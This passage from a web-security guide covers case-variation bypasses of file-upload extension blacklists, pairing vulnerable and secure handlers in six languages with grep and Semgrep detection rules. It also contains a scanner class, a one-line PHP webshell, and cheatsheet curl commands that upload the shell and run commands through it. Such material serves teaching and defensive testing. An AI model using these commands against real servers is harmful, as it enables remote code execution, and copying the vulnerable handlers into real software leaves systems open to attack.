        if self.results['accepted']:
            print(f"\n[+] Bypass extensions found:")
            for r in self.results['accepted']:
                exec_status = " [RCE ✓]" if r.get('executed') else ""
                print(f"    {r['extension']:12s} (from {r['base_ext']}){exec_status}")

        if self.results['executed']:
            print(f"\n[!!!] CONFIRMED RCE:")
            for r in self.results['executed']:
                print(f"    {r['extension']} → {r.get('url', 'URL unknown')}")

    def export_results(self, filename="case_bypass_results.json"):
        """Export results to JSON"""
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=2, default=str)
        print(f"\n[*] Results saved to {filename}")


if __name__ == "__main__":
    scanner = CaseBypassScanner(
        upload_url="https://target.com/api/upload",
        field="file",
        cookies={"session": "AUTH_TOKEN"},
        verify_base="https://target.com"
    )

    # Scan PHP extensions
    scanner.scan('php', delay=0.3)

    # Export results
    scanner.export_results()
```
::

---

## Vulnerable Code Analysis

### Source Code Patterns

::code-tree{default-value="php_vulnerable.php"}
```php [php_vulnerable.php]
<?php
// ═══ VULNERABLE — Case-sensitive blacklist ═══
$filename = $_FILES['file']['name'];
$ext = pathinfo($filename, PATHINFO_EXTENSION);

// Case-sensitive comparison — .PHP bypasses this
$blocked = ['php', 'phtml', 'php5', 'php7', 'pht', 'phar'];
if (in_array($ext, $blocked)) {
    die("Blocked extension");
}

// File is saved with original case — .PHP executes on Apache
move_uploaded_file($_FILES['file']['tmp_name'], "uploads/" . $filename);
echo "Upload successful";
?>
```

```python [python_vulnerable.py]
# ═══ VULNERABLE — Case-sensitive blacklist ═══
import os
from flask import Flask, request

BLOCKED = ['.php', '.phtml', '.php5', '.jsp', '.asp', '.aspx']

@app.route('/upload', methods=['POST'])
def upload():
    f = request.files['file']
    ext = os.path.splitext(f.filename)[1]  # Gets '.PHP' for shell.PHP

    # Case-sensitive check — '.PHP' not in BLOCKED list
    if ext in BLOCKED:
        return 'Blocked', 400

    f.save(os.path.join('uploads', f.filename))
    return 'OK', 200
```

```javascript [nodejs_vulnerable.js]
// ═══ VULNERABLE — Case-sensitive blacklist ═══
const path = require('path');
const multer = require('multer');

const BLOCKED = ['.php', '.phtml', '.php5', '.jsp', '.asp', '.aspx'];

const fileFilter = (req, file, cb) => {
    const ext = path.extname(file.originalname); // Gets '.PHP'

    // Case-sensitive — '.PHP' !== '.php'
    if (BLOCKED.includes(ext)) {
        return cb(new Error('Blocked'), false);
    }

    cb(null, true);
};
```

```java [Java_Vulnerable.java]
// ═══ VULNERABLE — Case-sensitive blacklist ═══
import java.util.*;

public class FileUploadServlet extends HttpServlet {
    private static final List<String> BLOCKED =
        Arrays.asList(".php", ".jsp", ".asp", ".aspx", ".jspx");

    protected void doPost(HttpServletRequest req, HttpServletResponse resp) {
        String filename = part.getSubmittedFileName();
        String ext = filename.substring(filename.lastIndexOf("."));

        // Case-sensitive — ".JSP" not in BLOCKED list
        if (BLOCKED.contains(ext)) {
            resp.sendError(400, "Blocked extension");
            return;
        }

        // File saved and potentially executed by Tomcat
        part.write("uploads/" + filename);
    }
}
```

```ruby [ruby_vulnerable.rb]
# ═══ VULNERABLE — Case-sensitive blacklist ═══
BLOCKED = %w[.php .phtml .php5 .jsp .asp .aspx]

post '/upload' do
  file = params[:file]
  ext = File.extname(file[:filename])  # Gets '.PHP'

  # Case-sensitive — '.PHP' != '.php'
  if BLOCKED.include?(ext)
    halt 400, 'Blocked extension'
  end

  File.open("uploads/#{file[:filename]}", 'wb') { |f| f.write(file[:tempfile].read) }
  'OK'
end
```

```go [go_vulnerable.go]
// ═══ VULNERABLE — Case-sensitive blacklist ═══
package main

var blocked = map[string]bool{
    ".php": true, ".phtml": true, ".php5": true,
    ".jsp": true, ".asp": true, ".aspx": true,
}

func uploadHandler(w http.ResponseWriter, r *http.Request) {
    file, header, _ := r.FormFile("file")
    ext := filepath.Ext(header.Filename) // Gets ".PHP"

    // Case-sensitive — ".PHP" not in blocked map
    if blocked[ext] {
        http.Error(w, "Blocked", 400)
        return
    }

    // File saved with original extension
    dst, _ := os.Create("uploads/" + header.Filename)
    io.Copy(dst, file)
}
```
::

### Secure Implementations

::code-collapse
```python [secure_implementations.py]
# ═══════════════════════════════════════════
# SECURE implementations — Case-insensitive validation
# ═══════════════════════════════════════════

# ── PHP — SECURE ──
"""
<?php
$filename = $_FILES['file']['name'];
$ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));  // ← NORMALIZE

// Whitelist approach (preferred over blacklist)
$allowed = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp'];
if (!in_array($ext, $allowed)) {
    die("Only image files allowed");
}

// Generate random filename (prevents extension tricks entirely)
$new_name = bin2hex(random_bytes(16)) . '.' . $ext;
move_uploaded_file($_FILES['file']['tmp_name'], "uploads/" . $new_name);
?>
"""

# ── Python — SECURE ──
ALLOWED = {'.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp'}

def secure_upload(file):
    ext = os.path.splitext(file.filename)[1].lower()  # ← NORMALIZE
    if ext not in ALLOWED:
        raise ValueError("Only image files allowed")

    # Random filename
    import secrets
    new_name = secrets.token_hex(16) + ext
    file.save(os.path.join('uploads', new_name))

# ── JavaScript — SECURE ──
"""
const ALLOWED = new Set(['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp']);

const fileFilter = (req, file, cb) => {
    const ext = path.extname(file.originalname).toLowerCase();  // ← NORMALIZE
    if (!ALLOWED.has(ext)) {
        return cb(new Error('Only images allowed'), false);
    }
    cb(null, true);
};
"""

# ── Java — SECURE ──
"""
private static final Set<String> ALLOWED = Set.of(".jpg", ".jpeg", ".png", ".gif");

String ext = filename.substring(filename.lastIndexOf(".")).toLowerCase();  // ← NORMALIZE
if (!ALLOWED.contains(ext)) {
    throw new SecurityException("Extension not allowed");
}

// Random filename
String newName = UUID.randomUUID().toString() + ext;
"""

# ── Go — SECURE ──
"""
var allowed = map[string]bool{
    ".jpg": true, ".jpeg": true, ".png": true, ".gif": true,
}

ext := strings.ToLower(filepath.Ext(header.Filename))  // ← NORMALIZE
if !allowed[ext] {
    http.Error(w, "Not allowed", 400)
    return
}
"""

# ── Ruby — SECURE ──
"""
ALLOWED = %w[.jpg .jpeg .png .gif .bmp .webp]
ext = File.extname(file[:filename]).downcase  # ← NORMALIZE
halt 400, 'Not allowed' unless ALLOWED.include?(ext)
"""
```
::

### Source Code Review Patterns

::code-group
```bash [Grep for Vulnerable Code]
# ── Search for case-sensitive extension checks ──

# PHP — in_array without strtolower
grep -rnP "in_array\s*\(\s*['\"]?\." --include="*.php" . | grep -v "strtolower\|strcasecmp\|mb_strtolower"
grep -rnP "pathinfo\s*\(" --include="*.php" . | grep -v "strtolower"
grep -rnP "\\\$ext\s*==\s*['\"]" --include="*.php" . | grep -v "strtolower"

# Python — direct comparison without .lower()
grep -rnP "\.endswith\s*\(" --include="*.py" . | grep -v "\.lower()"
grep -rnP "splitext.*\bin\b" --include="*.py" . | grep -v "\.lower()"
grep -rnP "==\s*['\"]\.php" --include="*.py" . | grep -v "lower"

# JavaScript — includes/indexOf without toLowerCase
grep -rnP "\.includes\s*\(" --include="*.js" . | grep -i "ext" | grep -v "toLowerCase\|toLocaleLowerCase"
grep -rnP "\.indexOf\s*\(" --include="*.js" . | grep -i "ext" | grep -v "toLowerCase"
grep -rnP "===\s*['\"]\.php" --include="*.js" .

# Java — contains/equals without toLowerCase
grep -rnP "\.contains\s*\(" --include="*.java" . | grep -i "ext" | grep -v "toLowerCase\|equalsIgnoreCase"
grep -rnP "\.equals\s*\(" --include="*.java" . | grep -i "ext" | grep -v "equalsIgnoreCase\|toLowerCase"

# Ruby — include? without downcase
grep -rnP "\.include\?\s*\(" --include="*.rb" . | grep -i "ext" | grep -v "downcase\|casecmp"

# Go — direct map lookup without ToLower
grep -rnP "blocked\[ext\]" --include="*.go" . | grep -v "ToLower\|strings.ToLower"

# C# — Contains without ToLower/OrdinalIgnoreCase
grep -rnP "\.Contains\s*\(" --include="*.cs" . | grep -i "ext" | grep -v "ToLower\|OrdinalIgnoreCase\|InvariantCultureIgnoreCase"

# Generic — find all extension validation logic
grep -rn "extension\|file.*type\|mime.*type\|blocked.*ext\|blacklist\|whitelist\|allowed.*ext" \
  --include="*.php" --include="*.py" --include="*.js" --include="*.java" \
  --include="*.rb" --include="*.go" --include="*.cs" .
```

```bash [Semgrep Rules]
# ── Semgrep for case-sensitive extension checking ──

# Install semgrep
pip3 install semgrep

# Run built-in rules
semgrep --config "p/upload" .
semgrep --config "p/owasp-top-ten" .

# Custom rule for case-sensitive extension check
cat > case_bypass_rule.yml << 'RULEEOF'
rules:
  - id: case-sensitive-extension-check
    patterns:
      - pattern-either:
          - pattern: |
              in_array($EXT, $BLOCKED)
          - pattern: |
              $BLOCKED.includes($EXT)
          - pattern: |
              $BLOCKED.contains($EXT)
          - pattern: |
              if $EXT in $BLOCKED
      - pattern-not: |
          strtolower(...)
      - pattern-not: |
          .toLowerCase()
      - pattern-not: |
          .lower()
      - pattern-not: |
          .ToLower()
      - pattern-not: |
          .downcase
    message: |
      Extension validation appears to use case-sensitive comparison.
      This may allow bypass with case variations like .PHP, .pHp, etc.
      Use case-insensitive comparison or normalize to lowercase first.
    severity: ERROR
    languages: [php, javascript, python, java, ruby]
RULEEOF

semgrep --config case_bypass_rule.yml .
```
::

---

## Reporting & Remediation

### Bug Bounty Report Template

::steps{level="4"}

#### Title
`Remote Code Execution via Case-Sensitive Extension Bypass in File Upload at [endpoint]`

#### Description
The file upload endpoint at `POST /api/upload` implements a blacklist-based extension validation that performs case-sensitive string comparison. By uploading a PHP webshell with a case-varied extension (e.g., `.pHp` instead of `.php`), the validation is bypassed. Apache's `mod_php` handler interprets `.pHp` as PHP and executes the uploaded file, resulting in Remote Code Execution.

#### Steps to Reproduce
```bash
# 1. Create PHP webshell
echo '<?php system($_GET["cmd"]); ?>' > shell.pHp

# 2. Upload with case-varied extension
curl -X POST https://target.com/api/upload \
  -F "file=@shell.pHp;type=image/jpeg" \
  -H "Cookie: session=AUTH_TOKEN"

# 3. Access the uploaded file
curl "https://target.com/uploads/shell.pHp?cmd=id"

# 4. Observe command execution output:
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### Impact
An authenticated attacker can execute arbitrary operating system commands on the web server. This allows complete server compromise including data exfiltration, lateral movement, and persistent access.

::

### Remediation Recommendations

::card-group
  :::card
  ---
  icon: i-lucide-shield-check
  title: Normalize to Lowercase
  ---
  Always convert extensions to lowercase before validation. Use `strtolower()` (PHP), `.lower()` (Python), `.toLowerCase()` (JS/Java), `.downcase` (Ruby), `strings.ToLower()` (Go) before comparing against allowed/blocked lists.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Use Whitelist Instead of Blacklist
  ---
  Define explicitly allowed extensions rather than trying to block dangerous ones. Blacklists inevitably miss edge cases. A whitelist of `.jpg`, `.png`, `.gif` is far more secure than trying to block every executable extension variant.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Generate Random Filenames
  ---
  Never preserve the original filename. Generate a random filename (UUID/hex) with the validated extension. This prevents all extension manipulation attacks: `bin2hex(random_bytes(16)) . '.jpg'`
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Validate Content Not Just Extension
  ---
  Check magic bytes, use `getimagesize()` / `Pillow` / `ImageMagick` to verify the file is actually the claimed type. Extension and Content-Type headers are easily spoofed.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Serve from Non-Executable Directory
  ---
  Store uploads outside the web root or in a directory with execution disabled via server configuration. Use `php_flag engine off` in `.htaccess` or configure Nginx to only serve static files from the upload directory.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Use Separate Domain for User Content
  ---
  Serve uploaded files from a separate domain (e.g., `cdn.target.com` or `user-content.target.com`) with restrictive `Content-Security-Policy` and `X-Content-Type-Options: nosniff` headers.
  :::
::

---

## References & Resources

::card-group
  :::card
  ---
  icon: i-lucide-external-link
  title: CWE-178 — Improper Handling of Case Sensitivity
  to: https://cwe.mitre.org/data/definitions/178.html
  target: _blank
  ---
  MITRE CWE entry specifically addressing case sensitivity handling flaws in security mechanisms including file extension validation.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: CWE-183 — Permissive List of Allowed Inputs
  to: https://cwe.mitre.org/data/definitions/183.html
  target: _blank
  ---
  CWE covering incomplete allowlist validation that misses case-varied representations of dangerous inputs.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: OWASP — Unrestricted File Upload
  to: https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
  target: _blank
  ---
  OWASP comprehensive guide on file upload vulnerabilities including extension bypass techniques and defense strategies.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: HackTricks — File Upload Bypass
  to: https://book.hacktricks.wiki/en/pentesting-web/file-upload/
  target: _blank
  ---
  Extensive cheatsheet covering case variation, double extensions, null bytes, magic bytes, and all major upload bypass techniques.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: PortSwigger — File Upload Vulnerabilities
  to: https://portswigger.net/web-security/file-upload
  target: _blank
  ---
  Interactive labs and learning materials for file upload attacks including extension validation bypasses with hands-on exercises.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: PayloadsAllTheThings — Upload Insecure Files
  to: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
  target: _blank
  ---
  Community-maintained repository with extension bypass wordlists, case permutation generators, and upload bypass payloads.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: Apache mod_php Handler Documentation
  to: https://httpd.apache.org/docs/2.4/mod/mod_mime.html
  target: _blank
  ---
  Apache documentation explaining how AddHandler and AddType directives match file extensions, including case sensitivity behavior.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: HackerOne — File Upload Disclosed Reports
  to: https://hackerone.com/hacktivity?querystring=file%20upload%20extension
  target: _blank
  ---
  Real-world disclosed bug bounty reports demonstrating extension bypass attacks on production applications.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: IIS Handler Mapping Documentation
  to: https://learn.microsoft.com/en-us/iis/configuration/system.webserver/handlers/
  target: _blank
  ---
  Microsoft IIS documentation covering handler mapping and case-insensitive extension matching behavior on Windows servers.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: Nginx Location Block Documentation
  to: https://nginx.org/en/docs/http/ngx_http_core_module.html#location
  target: _blank
  ---
  Nginx documentation explaining the difference between `~` (case-sensitive) and `~*` (case-insensitive) location regex matching.
  :::
::

---

## Quick Reference Cheatsheet

::field-group
  :::field{name="PHP case permutations" type="command"}
  `python3 -c "from itertools import product; [print('.'+' '.join(c)) for c in product(*[('p','P'),('h','H'),('p','P')])]"`
  :::

  :::field{name="Generate full wordlist" type="command"}
  `python3 -c "from itertools import product; f=open('w.txt','w'); [f.write(''.join(c)+'\n') for e in ['php','phtml','php5','asp','aspx','jsp'] for c in product(*[(x.lower(),x.upper()) if x.isalpha() else (x,) for x in e])]"`
  :::

  :::field{name="Upload .pHp shell" type="command"}
  `echo '<?php system($_GET["cmd"]); ?>' > s.pHp && curl -X POST https://target.com/upload -F "file=@s.pHp;type=image/jpeg" -H "Cookie: session=TOKEN"`
  :::

  :::field{name="Spray all PHP cases" type="command"}
  `for e in php phP pHp pHP Php PhP PHp PHP; do curl -s -o /dev/null -w "[%{http_code}] .${e}\n" -X POST URL -F "file=@shell.txt;filename=s.${e}"; done`
  :::

  :::field{name="Test server handler" type="command"}
  `for e in php PHP pHp Php; do echo -n ".${e}: "; curl -s -o /dev/null -w "%{http_code}" "https://target.com/x.${e}"; echo; done`
  :::

  :::field{name="Verify execution" type="command"}
  `curl -s "https://target.com/uploads/shell.pHp?cmd=id"`
  :::

  :::field{name="Case + double extension" type="command"}
  `curl -X POST https://target.com/upload -F "file=@shell.txt;filename=s.pHp.jpg;type=image/jpeg" -H "Cookie: session=TOKEN"`
  :::

  :::field{name="Case + magic bytes" type="command"}
  `printf '\xFF\xD8\xFF\xE0<?php system($_GET["cmd"]); ?>' > s.PhP && curl -X POST https://target.com/upload -F "file=@s.PhP;type=image/jpeg"`
  :::

  :::field{name="Grep vulnerable code" type="command"}
  `grep -rnP "in_array\s*\(\s*['\"]?\." --include="*.php" . | grep -v strtolower`
  :::

  :::field{name="Check filesystem case" type="command"}
  `curl -s -o /dev/null -w "%{http_code}" https://target.com/INDEX.HTML` — compare with `/index.html`
  :::
::